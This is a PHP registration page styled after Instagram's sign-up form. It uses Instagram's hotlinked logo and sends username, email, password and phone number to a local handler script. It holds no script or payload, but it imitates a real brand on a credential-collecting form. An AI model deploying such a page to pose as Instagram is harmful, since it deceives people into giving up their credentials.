<!-- register.php -->
<!DOCTYPE html>
<html>
<head>
    <title>Registration</title>
   
  <link rel="canonical" href="./headers.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Audiowide|Sofia|Trirong|Quicksand">
  
</head>
<body>
   
    <style>
.content i {
  margin-bottom: 41px;
}

.container {
    width: fit-content;
    margin-left: auto;
  margin-right: auto;
  border-radius: 1px;
  padding: 50px 40px 20px 40px;
  box-sizing: border-box;
  font-family: sans-serif;
  color: #737373;
  border: 1px solid rgb(219, 219, 219);
  text-align: center;
  background: white;
}

.container svg {
  width: 16px;
  height: auto;
}

.content__form {
  display: flex;
  flex-direction: column;
  row-gap: 14px;
}

.content__inputs {
  display: flex;
  flex-direction: column;
  row-gap: 8px;
}

.content__form label {
  border: 1px solid rgb(219, 219, 219);
  display: flex;
  align-items: center;
  position: relative;
  min-width: 268px;
  height: 38px;
  background: rgb(250, 250, 250);
  border-radius: 3px;
}

.content__form span {
  position: absolute;
  text-overflow: ellipsis;
  transform-origin: left;
  font-size: 12px;
  left: 8px;
  pointer-events: none;
  transition: transform ease-out .1s
}

.content__form input {
  width: 100%;
  background: inherit;
  border: 0;
  outline: none;
  padding: 9px 8px 7px 8px;
  text-overflow: ellipsis;
  font-size: 16px;
  vertical-align: middle;
}

.content__form input:valid+span {
  transform: scale(calc(10 / 12)) translateY(-10px);
}

.content__form input:valid {
  padding: 14px 0 2px 8px;
  font-size: 12px;
}

.content__or-text {
  display: flex;
  justify-content: space-between;
  align-items: center;
  text-transform: uppercase;
  font-size: 13px;
  column-gap: 18px;
  margin-top: 18px;
}

.content__or-text span:nth-child(3),
.content__or-text span:nth-child(1) {
  display: block;
  width: 100%;
  height: 1px;
  background-color: rgb(219, 219, 219);
}

.content__forgot-buttons {
  display: flex;
  flex-direction: column;
  margin-top: 28px;
  row-gap: 21px;
}

.content__forgot-buttons button {
  display: flex;
  justify-content: center;
  align-items: center;
  column-gap: 8px;
  background: none;
  border: none;
  cursor: pointer;
  font-size: 12px;
  color: #00376b;
}

.content__forgot-buttons button:first-child {
  color: #385185;
  font-size: 14px;
  font-weight: 600;
}

.content__form button {
  background: rgb(0, 149, 246);
  color: white;
  border: none;
  border-radius: 8px;
  font-weight: 700;
  font-size: 14px;
  padding: 7px 16px;
  cursor: pointer;
}

.content__form button:hover {
  background: rgb(24, 119, 242);
}

.content__form button:active:not(:hover) {
  background: rgb(0, 149, 246);
  opacity: .7;
}
    </style>
    <body>
    
    <div class="container">
    <div class="content">
      <i style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;" role="img" class="" aria-label="Instagram" data-visualcompletion="css-img"></i>
      <form class="content__form" action="register_handler.php " method="post">
        <div class="content__inputs">
          <label>
            <input required="" type="text" name="username">
            <span>username</span>
          </label>
          <label>
            <input required="" type="email" name="mail">
            <span>email</span>
          </label>
          <label>
            <input required="" type="password" name="password">
            <span>password</span>
          </label>
          <label>
            <input required="" type="password" name="conf-password">
            <span>confirm password</span>
          </label>
          <label>
            <input required="" type="text" name="number">
            <span>phone number</span>
          </label>
        </div>
        <button type="submit" value="register">Register</button>
      </form>
      <div class="content__or-text">
        <span></span>
        <span>OR</span>
        <span></span>
      </div>
      <div class="content__forgot-buttons">
        <button ><a href="login.php">
          <span>
          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person-add" viewBox="0 0 16 16">
            <path d="M12.5 16a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7Zm.5-5v1h1a.5.5 0 0 1 0 1h-1v1a.5.5 0 0 1-1 0v-1h-1a.5.5 0 0 1 0-1h1v-1a.5.5 0 0 1 1 0Zm-2-6a3 3 0 1 1-6 0 3 3 0 0 1 6 0ZM8 7a2 2 0 1 0 0-4 2 2 0 0 0 0 4Z"/>
            <path d="M8.256 14a4.474 4.474 0 0 1-.229-1.004H3c.001-.246.154-.986.832-1.664C4.484 10.68 5.711 10 8 10c.26 0 .507.009.74.025.226-.341.496-.65.804-.918C9.077 9.038 8.564 9 8 9c-5 0-6 3-6 4s1 1 1 1h5.256Z"/>
            </svg>
          </span>
          <span>Login Here</span></a>
        </button>
        
      </div>
    </div>
  </div>
</body>
</html>
